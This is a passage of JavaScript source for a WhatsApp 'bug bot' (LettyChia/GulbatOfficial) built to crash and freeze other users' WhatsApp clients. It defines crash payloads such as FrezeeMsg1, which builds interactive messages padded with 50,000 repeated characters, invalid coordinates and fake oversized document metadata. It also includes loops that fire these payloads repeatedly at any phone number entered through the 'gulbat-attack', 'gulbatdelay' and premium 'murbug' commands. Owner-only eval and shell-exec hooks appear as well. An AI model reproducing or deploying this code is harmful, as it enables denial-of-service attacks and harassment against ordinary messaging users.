      let virtex = "⿻🎭꙰꙰꙰꙰꙰꙰꙰꙰꙲꙱҈⃠𝐕𝐨𝐥𝐠𝐢𝐨𝐝 𝐈𝐬 𝐁𝐚𝐜𝐤🎭꙰҉҈⃟⿻";
      let memekz = Date.now();
      await XbatsOffc.relayMessage(target, {
        groupMentionedMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: -999.035,
                  degreesLongitude: 999.035
                },
                hasMediaAttachment: true
              },
              body: {
                text: "🎭꙰꙰꙰꙰꙰꙰꙰꙰꙲꙱҈⃠𝐕𝐨𝐥𝐠𝐢𝐨𝐝 𝐈𝐬 𝐁𝐚𝐜𝐤🎭꙰҉҈⃟🇯🇵" + "ꦾ".repeat(50000) + "@1".repeat(30)
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: Array.from({
                  length: 5
                }, () => "1@newsletter"),
                groupMentions: [{
                  groupJid: "1@newsletter",
                  groupSubject: "MOON KILLER"
                }]
              }
            }
          }
        }
      }, {
        participant: {
          jid: target
        }
      });
    }
    ;
    async function FrezeeMsg1(target) {
      let virtex = "⿻ᬃ🎭꙰꙰꙰꙰꙰꙰꙰꙰꙲꙱҈⃠𝐕𝐨𝐥𝐠𝐢𝐨𝐝 𝐈𝐬 𝐁𝐚𝐜𝐤🎭꙰҉҈⃟🇯🇵⿻";
      XbatsOffc.relayMessage(target, {
        groupMentionedMessage: {
          message: {
            interactiveMessage: {
              header: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                  fileLength: "999999999",
                  pageCount: 9999999999999,
                  mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                  fileName: virtex,
                  fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                  directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1715880173",
                  contactVcard: true
                },
                hasMediaAttachment: true
              },
              body: {
                text: "🎭꙰꙰꙰꙰꙰꙰꙰꙰꙲꙱҈⃠𝐕𝐨𝐥𝐠𝐢𝐨𝐝 𝐈𝐬 𝐁𝐚𝐜𝐤🎭꙰҉҈⃟🇯🇵" + "ꦾ".repeat(50000) + "@1".repeat(30)
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: Array.from({
                  length: 5
                }, () => "1@newsletter"),
                groupMentions: [{
                  groupJid: "1@newsletter",
                  groupSubject: "DinzID Chx CRASH👻👻"
                }]
              }
            }
          }
        }
      }, {
        participant: {
          jid: target
        }
      });
    }
    async function Combox(target) {
      for (let i = 0; i < 20; i++) {
        await DocSystem(target, Null);
        await DocSystem2(target, Null);
        await DocSystem3(target, Null);
        await BugFrezee(target, Null);
        await EncryptMessage(target, Null);
        await FrezeeMsg1(target, Null);
        await FrezeeMsg2(target, Null);
      }
      console.log(chalk.red.bold(`DinzID Chx CRASH👻👻${target}`));
    }
    async function Combox2(target) {
      for (let i = 0; i < 20; i++) {
        await CrashUi(target);
        await InVisiXz(target);
        await InVisiLoc(target);
      }
      console.log(chalk.red.bold(`DinzID Chx CRASH👻👻${target}`));
    }
    async function Combox3(target) {
      for (let i = 0; i < 20; i++) {
        await CrashUi(target);
        await InVisiXz(target);
        await InVisiLoc(target);
        await DocSystem(target);
        await DocSystem2(target);
        await DocSystem3(target);
        await BugFrezee(target);
        await EncryptMessage(target);
        await FrezeeMsg1(target);
        await FrezeeMsg2(target);
      }
      console.log(chalk.red.bold(`DinzID Chx CRASH👻👻${target}`));
    }

//╍╍╍╍╍╍〔𝗔𝗞𝗛𝗜𝗥 𝗙𝗨𝗡𝗖𝗧𝗜𝗢𝗡〕╍╍╍╍╍╍╍╍//

const figlet = require('figlet');
if (m.message && m.text.startsWith('.')) {  // Hanya menampilkan pesan yang diawali dengan titik
    

    // Membuat tampilan hesanzr dengan font besar menggunakan figlet
    figlet('GULBAT', (err, data) => {
        if (err) {
            console.log(chalk.white('Error with figlet...'));
            return;
        }
        console.log(
            chalk.white('\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n'+data) + '\n' +  // Hesanzr dengan warna oranye cerah
            chalk.bgRed.white(`⫹ 𝐌𝐄𝐒𝐒𝐀𝐆𝐄 ⫺ `) + chalk.redBright('┃  '+m.text) + '\n' +  // Pesan tebal dan warna cerah
            chalk.bgWhite.black(`⫹ 𝐒𝐄𝐍𝐃𝐄𝐑𝐑 ⫺ `) + chalk.redBright('┃  '+m.sender) + '\n' +  // Pengirim dengan warna cerah
            chalk.bgRed.white(`⫹ 𝐌𝐄𝐒𝐓𝐘𝐏𝐄 ⫺ `) + chalk.redBright('┃  '+m.mtype) + '\n' +  // Jenis pesan dengan merah
            chalk.bgWhite.black(`⫹ 𝐅𝐑𝐎𝐌 𝐈𝐍 ⫺ `) + (m.isGroup ? chalk.redBright('┃  GROUP CHAT') : chalk.redBright('┃  PRIVATE CHAT')) + '\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n'  // Status chat dengan latar belakang
        );
    });
}
const qmsg = (quoted.msg || quoted)
// Gak Usah Di Apa Apain Jika Tidak Mau Error
let ppuser
try {
ppuser = await XbatsOffc.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://files.catbox.moe/2lw5hm.jpg'
}

const dbPath = './database/listsc.json';

// Load database
function loadDatabase() {
    if (!fs.existsSync(dbPath)) fs.writeFileSync(dbPath, JSON.stringify([]));
    return JSON.parse(fs.readFileSync(dbPath));
}

// Save database
function saveDatabase(data) {
    fs.writeFileSync(dbPath, JSON.stringify(data, null, 2));
}
    
    
switch (command) {
case "xmenu": {
let teksnya = `
你好 @${m.sender.split('@')[0]}!

⚠️ *Welcome to LettyChia 黑暗之源* ⚠️ 
This realm is not for the weak... 
Enter the sacred developer channel for updates & arcane knowledge:

${global.zz}𓆩 Mystic Developer Channel 𓆪${global.zz} 
https://whatsapp.com/channel/0029Vb3PX3yLSmbgdKkIN0K

${global.zz}⇣ Tap one of the cursed options below ⇣${global.zz}
`;

await XbatsOffc.sendMessage(m.chat, {
 footer: `GulbatOfficial`,
 buttons: [
 {
   buttonId: 'action',
   buttonText: { displayText: '☯️ Open Hell Menu 地狱菜单' },
   type: 4,
   nativeFlowInfo: {
     name: 'single_select',
     paramsJson: JSON.stringify({
       title: '☯️ Choose your path 命运选择',
       sections: [
         {
           title: '★ LettyChia Menu 核心菜单',
           highlight_label: '⚡ Featured',
           rows: [
             {
               title: "💭 BUG MENU 漏洞菜单",
               description: "Unleash the cursed bugs | 放出禁忌之虫",
               id: `.xbugmenu`
             },
             {
               title: "👑 OWNER MENU 拥有者菜单",
               description: "Master of the void | 虚空的主宰",
               id: `.ownermenu`
             }
           ]
         }
       ]
     })
   }
 },
 {
   buttonId: `.tqto`,
   buttonText: { displayText: '🔥 Thanks To 买源码' },
   type: 1
 },
 {
   buttonId: `.dev`,
   buttonText: { displayText: '👑 Owner Bot 拥有者' },
   type: 1
 }
 ],
 headerType: 1,
 viewOnce: true,
 document: fs.readFileSync("./package.json"),
 fileName: `${global.namabot}`,
 mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
 fileLength: 99999999,
 caption: teksnya,
 contextInfo: {
   isForwarded: true,
   mentionedJid: [m.sender],
   forwardedNewsletterMessageInfo: {
     newsletterJid: global.idSaluran,
     newsletterName: global.namaSaluran
   },
   externalAdReply: {
     title: `${global.namabot} - 2025`,
     body: `已被 WhatsApp 认证 | Verified by WhatsApp`,
     thumbnailUrl: 'https://img1.pixhost.to/images/5962/603210221_imgtmp.jpg',
     sourceUrl: global.linkSaluran,
     mediaType: 1,
     renderLargerThumbnail: true,
   },
 },
}, { quoted: qloc })
}
break;
case 'ownermenu': {
let teksnya = `╭── 「 *INFO BOT* 」
│> ネ 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 : ${global.ownername}
│> ネ 𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : ${global.namabot}
│> ネ 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : ${global.versisc}
│> ネ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${runtime(process.uptime())}
╰──────────────𖣐

ᖫ═══『 𝗢𝗪𝗡𝗘𝗥 𝗠𝗘𝗡𝗨 』═══ᖭ

> ${global.simbol} ᴘᴜʙʟɪᴄ
> ${global.simbol} sᴇʟғ
> ${global.simbol} ᴀᴅᴅᴍᴜʀʙᴜɢ
> ${global.simbol} ᴅᴇʟᴍᴜʀʙᴜɢ
────────────────⪩`
await XbatsOffc.sendMessage(m.chat, {
  footer: `${global.zz}© Made By GulbatOffc${global.zz}`,
  buttons: [
    {
    buttonId: `.xmenu`,
      buttonText: { displayText: '𝗕𝗮𝗰𝗸 𝗧𝗼 𝗠𝗲𝗻𝘂' },
      type: 1
    },
    {
      buttonId: `.dev`,
      buttonText: { displayText: '👑 Owner Bot 拥有者' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: `LettyChia - V̷5̷.̷0̷.̷0̷`,
  mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
  fileLength: 10,
  caption: teksnya,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   }, 
    externalAdReply: {
      title: `LettyChia - 2̷0̷2̷5̷`,
      body: `Terverifikasi Oleh WhatsApp`,
      thumbnailUrl: global.imgthumb,
      sourceUrl: global.linkSaluran,
      mediaType: 1,
      renderLargerThumbnail: true,
    },
  },
}, {quoted: qloc})
}
break
case 'xbugmenu': {
let teksnya = `
> gunakan bot dengan bijak dan benar, jangan pernah menggunakan bot untuk merusak atau mengganggu seseorang

╭── 「 *INFO BOT* 」
│ ネ 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 : ${global.ownername}
│ ネ 𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : ${global.namabot}
│ ネ 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : ${global.versisc}
╰──────────────𖣐

┏━『 𝗕𝗨𝗚 𝗠𝗘𝗡𝗨 』
┃${global.simbol} ɢᴜʟʙᴀᴛ-ᴀᴛᴛᴀᴄᴋ
┗━━━━━━━━━━━━━━━`
await XbatsOffc.sendMessage(m.chat, {
  footer: `${global.zz}© Made By GulbatOffc${global.zz}`,
  buttons: [
    {
    buttonId: `.xmenu`,
      buttonText: { displayText: '𝗕𝗮𝗰𝗸 𝗧𝗼 𝗠𝗲𝗻𝘂' },
      type: 1
    },
    {
      buttonId: `.dev`,
      buttonText: { displayText: '👑 Owner Bot 拥有者' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: `LettyChia - V̷5̷.̷0̷.̷0̷`,
  mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
  fileLength: 10,
  caption: teksnya,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   }, 
    externalAdReply: {
      title: `LettyChia - 2̷0̷2̷5̷`,
      body: `Terverifikasi Oleh WhatsApp`,
      thumbnailUrl: global.imgthumb,
      sourceUrl: global.linkSaluran,
      mediaType: 1,
      renderLargerThumbnail: true,
    },
  },
}, {quoted: qloc})
}
break
case 'gulbat-attack': {
 if (!isPremium && !isCreator) return m.reply(msg.premium);
 if (!args[0]) return payreply("⚠️ Gunakan: .gulbat-attack [nomor target]");

 let target = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';

 let menulol =`╭━[ 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 ]
┃ 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 : GulbatOfficial
┃ 𝗧𝗮𝗿𝗴𝗲𝘁 : ${args[0]}
┃ 𝗥𝘂𝗻𝘁𝗶𝗺𝗲: ${runtime(process.uptime())}
╰━━━━━❍`;

 const buttons = [
 {
 buttonId: 'single_select',
 buttonText: { displayText: '𝗦𝗲𝗹𝗲𝗰𝘁-𝗕𝘂𝗴' },
 type: 4,
 nativeFlowInfo: {
 name: 'single_select',
 paramsJson: JSON.stringify({
 title: "𝗦𝗲𝗹𝗲𝗰𝘁-𝗕𝘂𝗴",
 sections: [
 {
 title: " ⌜ Delay Bug|延迟错误💦⌟ ", 
 
 rows: [
 { 
 title: "𝐃𝐞𝐥𝐚𝐲𝐄𝐱𝐭𝐫𝐢𝐦𝐞", 
 description: "Delay By GulbatOfficial", 
 id: ".gulbatdelay " + args[0] 
 }
 ]
 },
 {
 title: " ⌜ Crash Bug|崩溃错误 ⚡ ⌟ ", 
 
 rows: [
 { 
 title: "𝐂𝐫𝐚𝐬𝐡𝐒𝐲𝐬𝐭𝐞𝐦", 
 description: "Crash By GulbatOfficial", 
 id: ".gulbatcrash " + args[0] 
 },
 ]
 }
 ]
 })
 }
 }
 ];

 const buttonMessage = {
 image: {
 url: "https://img1.pixhost.to/images/6151/605839325_imgtmp.jpg" // Ganti URL dengan gambar yang diinginkan
 },
 caption: menulol,
 footer: "GulbatOfficial",
 buttons: buttons,
 headerType: 4,
 viewOnce: true
 };

const fakeCentangBiru = {
 key: {
 participant: '0@s.whatsapp.net',
 remoteJid: 'status@broadcast'
 },
 message: {
 locationMessage: {
 name: `Target : wa.me/${args[0]}`,
 jpegThumbnail: null
 }
 }
 };

 await XbatsOffc.sendMessage(m.chat, buttonMessage, { quoted: fakeCentangBiru });
}
break;
case 'gulbatdelay': {
    if (!isPremium && !isCreator) return m.reply(msg.premium);
  let target = args[0] ? args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : null;
    if (!target) return m.reply("Gunakan tombol dengan benar!");

    // Mengirim gambar, caption, dan button saat proses
    let Menu = `\`乂 𝗣 𝗥 𝗢 𝗖 𝗘 𝗦 𝗦\`

𝐍𝐨𝐦𝐨𝐫 𝐓𝐚𝐫𝐠𝐞𝐭 : ${target}
𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 : GulbatDevloper`;

    await XbatsOffc.sendMessage(m.chat, {
        image: {
            url: "https://img1.pixhost.to/images/6151/605839325_imgtmp.jpg" // Ganti URL gambar sesuai kebutuhan
        },
        caption: Menu,
        footer: `Proses Attacking Waiting 5m`,
        buttons: [
            {
                buttonId: ".dev", 
                buttonText: {
                    displayText: '👑 Owner Bot 拥有者'
                }
            }
        ],
        viewOnce: true,
        headerType: 6
    }, { quoted: m });

    // Simulasi waktu proses
    let startTime = Date.now();
    for (let i = 0; i < 30; i++) {
    //Function taro di sini
      await CrashUi(target);
        await InVisiXz(target);
        await InVisiLoc(target);
        await DocSystem(target);
        await DocSystem2(target);
        await DocSystem3(target);
        await BugFrezee(target);
        await EncryptMessage(target);
        await FrezeeMsg1(target);
        await FrezeeMsg2(target);

    await sleep(500); // Tunggu 500ms setelah setiap pengiriman
    }

    // Waktu selesai
    let endTime = Date.now();
    let elapsedTime = ((endTime - startTime) / 1000).toFixed(2);

    // Kirim hasil akhir
    const resultImageUrl = 'https://img1.pixhost.to/images/6151/605839325_imgtmp.jpg'; // Ganti URL sesuai kebutuhan
    const resultCaption = `\`乂 𝗗 𝗢 𝗡 𝗘\`
> ᴛᴀʀɢᴇᴛ ʜᴀs ʙᴇᴇɴ ᴄʀᴀsʜᴇᴅ
𝐍𝐨𝐦𝐨𝐫 𝐓𝐚𝐫𝐠𝐞𝐭 : ${target}
𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 : GulbatDevloper`;

    await XbatsOffc.sendMessage(m.chat, {
        image: {
            url: resultImageUrl
        },
        caption: resultCaption,
        footer: "Proses Attacking Waiting 5m",
        buttons: [
            {
                buttonId: ".xmenu", 
                buttonText: {
                    displayText: '𝗕𝗮𝗰𝗸 𝗧𝗼 𝗠𝗲𝗻𝘂'
                }
            },
            {
                buttonId: ".dev", 
                buttonText: {
                    displayText: '👑 Owner Bot 拥有者'
                }
            }
        ],
        viewOnce: true,
        headerType: 6
    }, { quoted: m });
}
break;  
case 'gulbatcrash': {
    if (!isPremium && !isCreator) return m.reply(msg.premium);
  let target = args[0] ? args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : null;
    if (!target) return m.reply("Gunakan tombol dengan benar!");

    // Mengirim gambar, caption, dan button saat proses
    let Menu = `\`乂 𝗣 𝗥 𝗢 𝗖 𝗘 𝗦 𝗦\`

𝐍𝐨𝐦𝐨𝐫 𝐓𝐚𝐫𝐠𝐞𝐭 : ${target}
𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 : GulbatDevloper`;

    await XbatsOffc.sendMessage(m.chat, {
        image: {
            url: "https://img1.pixhost.to/images/6151/605839325_imgtmp.jpg" // Ganti URL gambar sesuai kebutuhan
        },
        caption: Menu,
        footer: `Proses Attacking Waiting 5m`,
        buttons: [
            {
                buttonId: ".dev", 
                buttonText: {
                    displayText: 'OwnerBot'
                }
            }
        ],
        viewOnce: true,
        headerType: 6
    }, { quoted: m });

    // Simulasi waktu proses
    let startTime = Date.now();

    for (let i = 0; i < 50; i++) {
      //function taro disini
      
    await sleep(1000); // Tunggu 500ms setelah setiap pengiriman
    }

    // Waktu selesai
    let endTime = Date.now();
    let elapsedTime = ((endTime - startTime) / 1000).toFixed(2);

    // Kirim hasil akhir
    const resultImageUrl = 'https://img1.pixhost.to/images/6151/605839325_imgtmp.jpg'; // Ganti URL sesuai kebutuhan
    const resultCaption = `\`乂 𝗗 𝗢 𝗡 𝗘\`
> ᴛᴀʀɢᴇᴛ ʜᴀs ʙᴇᴇɴ ᴄʀᴀsʜᴇᴅ
𝐍𝐨𝐦𝐨𝐫 𝐓𝐚𝐫𝐠𝐞𝐭 : ${target}
𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 : GulbatDevloper`;

    await XbatsOffc.sendMessage(m.chat, {
        image: {
            url: resultImageUrl
        },
        caption: resultCaption,
        footer: "succes sending bug",
        buttons: [
            {
                buttonId: ".xmenu", 
                buttonText: {
                    displayText: '𝗕𝗮𝗰𝗸 𝗧𝗼 𝗠𝗲𝗻𝘂'
                }
            },
            {
                buttonId: ".dev", 
                buttonText: {
                    displayText: 'OwnerBot'
                }
            }
        ],
        viewOnce: true,
        headerType: 6
    }, { quoted: m });
}
break;  
case 'public': {
    if (!isCreator) return
    // Ketika Ada Orang Lain/ Selain Owner Yang Mengetik Command Ini Maka Bot Tidak Akan Merespon Walau Menggunakan Mode Public Dan Ini Akan Mengurangi Spam
    XbatsOffc.public = true
    m.reply(`*Switch To Mode :* \`Public\``)
}
break
case 'dev': {
        try {
        let vcard = `BEGIN:VCARD\nVERSION:3.0\nFN:${global.ownername}\nTEL;type=CELL;type=VOICE;waid=${global.owner}:+${global.owner}\nEND:VCARD`;

        let quotedMessage = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `Kontak Owner Kami`,jpegThumbnail: ""}}}
            
        

        await XbatsOffc.sendMessage(m.chat, { contacts: { displayName: global.ownername, contacts: [{ vcard }] } }, { quoted: quotedMessage });
    } catch (error) {
        console.error("Error saat mengirim kontak owner:", error);
    }
}
break
case "addmurbug": {
    if (!isCreator) return
    // Ketika Ada Orang Lain/ Selain Owner Yang Mengetik Command Ini Maka Bot Tidak Akan Merespon Walau Menggunakan Mode Public Dan Ini Akan Mengurangi Spam
    if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} ${global.owner}`)
   let prrkek = q.split("|")[0].replace(/[^0-9]/g, '') + `@s.whatsapp.net`
    let ceknya = await XbatsOffc.onWhatsApp(prrkek) // Mengecek Apkah Nomor ${prrkek} Terdaftar Di WhatsApp 
    if (ceknya.length == 0) return m.reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
    premium.push(prrkek)
    fs.writeFileSync("./database/premium.json", JSON.stringify(premium))
    m.reply(`Successfully Added ${prrkek} To Murbug`)
}
break

case "delmurbug": {
    if (!isCreator) return
    // Ketika Ada Orang Lain/ Selain Owner Yang Mengetik Command Ini Maka Bot Tidak Akan Merespon Walau Menggunakan Mode Public Dan Ini Akan Mengurangi Spam
    if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} ${global.owner}`)
    let ya = q.split("|")[0].replace(/[^0-9]/g, '') + `@s.whatsapp.net`
    let unp = premium.indexOf(ya)
    premium.splice(unp, 1)
    fs.writeFileSync("./database/premium.json", JSON.stringify(premium))
    m.reply(`Successfully Removed ${ya} From Murbug`)
}
break

//End Case
default:
if ((budy.match) && ["tes","bot"].includes(budy)) {
m.reply(`
\`Bot Activated ⚡\``)
}

if ((budy.match) && ["Assalamualaikum", "assalamualaikum", "Assalamu'alaikum",].includes(budy)) {
m.reply(`WaalaikumSalam ${pushname}`)
}

if (budy.startsWith('=>')) {
    if (!isCreator) return

    function Return(sul) {
        sat = JSON.stringify(sul, null, 2)
        bang = util.format(sat)
        if (sat == undefined) {
            bang = util.format(sul)
        }
        return m.reply(bang)
    }
    try {
        m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
    } catch (e) {
        m.reply(String(e))
    }
}

if (budy.startsWith('>')) {
    if (!isCreator) return;
    try {
        let evaled = await eval(budy.slice(2));
        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
        await m.reply(evaled);
    } catch (err) {
        m.reply(String(err));
    }
}

if (budy.startsWith('$')) {
    if (!isCreator) return
    exec(budy.slice(2), (err, stdout) => {
        if (err) return m.reply(`${err}`)
        if (stdout) return m.reply(stdout)
    })
}

}
} catch (err) {
    console.log(util.format(err))
}
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.redBright(`Update ${__filename}`))
    delete require.cache[file]
    require(file)
})
